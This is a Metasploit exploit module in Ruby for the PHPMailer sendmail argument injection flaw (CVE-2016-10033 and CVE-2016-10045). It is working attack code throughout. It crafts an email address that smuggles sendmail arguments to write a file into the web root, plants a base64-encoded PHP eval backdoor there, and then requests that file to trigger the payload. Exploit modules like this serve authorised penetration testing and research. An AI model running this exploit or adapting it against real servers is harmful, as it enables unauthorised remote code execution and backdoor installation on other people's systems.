# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;PHPMailer Sendmail Argument Injection&#039;,
      &#039;Description&#039;    => %q{
        PHPMailer versions up to and including 5.2.19 are affected by a
        vulnerability which can be leveraged by an attacker to write a file with
        partially controlled contents to an arbitrary location through injection
        of arguments that are passed to the sendmail binary. This module
        writes a payload to the web root of the webserver before then executing
        it with an HTTP request. The user running PHPMailer must have write
        access to the specified WEB_ROOT directory and successful exploitation
        can take a few minutes.
      },
      &#039;Author&#039;         => [
        &#039;Dawid Golunski&#039;,   # vulnerability discovery and original PoC
        &#039;Spencer McIntyre&#039;  # metasploit module
      ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2016-10033&#039;],
        [&#039;CVE&#039;, &#039;2016-10045&#039;],
        [&#039;EDB&#039;, &#039;40968&#039;],
        [&#039;EDB&#039;, &#039;40969&#039;],
        [&#039;URL&#039;, &#039;https://github.com/opsxcq/exploit-CVE-2016-10033&#039;],
        [&#039;URL&#039;, &#039;https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Dec 26 2016&#039;,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Payload&#039;        => {&#039;DisableNops&#039; => true},
      &#039;Targets&#039;        => [
        [&#039;PHPMailer <5.2.18&#039;, {}],
        [&#039;PHPMailer 5.2.18 - 5.2.19&#039;, {}]
      ],
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;,  [true, &#039;Path to the application root&#039;, &#039;/&#039;]),
        OptString.new(&#039;TRIGGERURI&#039;, [false, &#039;Path to the uploaded payload&#039;, &#039;&#039;]),
        OptString.new(&#039;WEB_ROOT&#039;,   [true, &#039;Path to the web root&#039;, &#039;/var/www&#039;])
      ], self.class)
    register_advanced_options(
      [
        OptInt.new(&#039;WAIT_TIMEOUT&#039;, [true, &#039;Seconds to wait to trigger the payload&#039;, 300])
      ], self.class)
  end

  def trigger(trigger_uri)
    print_status("Sleeping before requesting the payload from: #{trigger_uri}")

    page_found = false
    sleep_time = 10
    wait_time = datastore[&#039;WAIT_TIMEOUT&#039;]
    print_status("Waiting for up to #{wait_time} seconds to trigger the payload")
    while wait_time > 0
      sleep(sleep_time)
      wait_time -= sleep_time
      res = send_request_cgi(
        &#039;method&#039;   => &#039;GET&#039;,
        &#039;uri&#039;      => trigger_uri
      )

      if res.nil?
        if page_found or session_created?
          print_good(&#039;Successfully triggered the payload&#039;)
          break
        end

        next
      end

      next unless res.code == 200

      if res.body.length == 0 and not page_found
        print_good(&#039;Successfully found the payload&#039;)
        page_found = true
      end
    end
  end

  def exploit
    payload_file_name = "#{rand_text_alphanumeric(8)}.php"
    payload_file_path = "#{datastore[&#039;WEB_ROOT&#039;]}/#{payload_file_name}"

    if target.name == &#039;PHPMailer <5.2.18&#039;
      email = "\"#{rand_text_alphanumeric(4 + rand(8))}\\\" -OQueueDirectory=/tmp -X#{payload_file_path} #{rand_text_alphanumeric(4 + rand(8))}\"@#{rand_text_alphanumeric(4 + rand(8))}.com"
    elsif target.name == &#039;PHPMailer 5.2.18 - 5.2.19&#039;
      email = "\"#{rand_text_alphanumeric(4 + rand(8))}\\&#039; -OQueueDirectory=/tmp -X#{payload_file_path} #{rand_text_alphanumeric(4 + rand(8))}\"@#{rand_text_alphanumeric(4 + rand(8))}.com"
    else
      fail_with(Failure::NoTarget, &#039;The specified version is not supported&#039;)
    end

    data = Rex::MIME::Message.new
    data.add_part(&#039;submit&#039;, nil, nil, &#039;form-data; name="action"&#039;)
    data.add_part("<?php eval(base64_decode(&#039;#{Rex::Text.encode_base64(payload.encoded)}&#039;)); ?>", nil, nil, &#039;form-data; name="name"&#039;)
    data.add_part(email, nil, nil, &#039;form-data; name="email"&#039;)
    data.add_part("#{rand_text_alphanumeric(2 + rand(20))}", nil, nil, &#039;form-data; name="message"&#039;)

    print_status("Writing the backdoor to #{payload_file_path}")
    res = send_request_cgi(
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri),
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;     => data.to_s
    )

    register_files_for_cleanup(payload_file_path)

    trigger(normalize_uri(datastore[&#039;TRIGGERURI&#039;].blank? ? target_uri : datastore[&#039;TRIGGERURI&#039;], payload_file_name))
  end
end

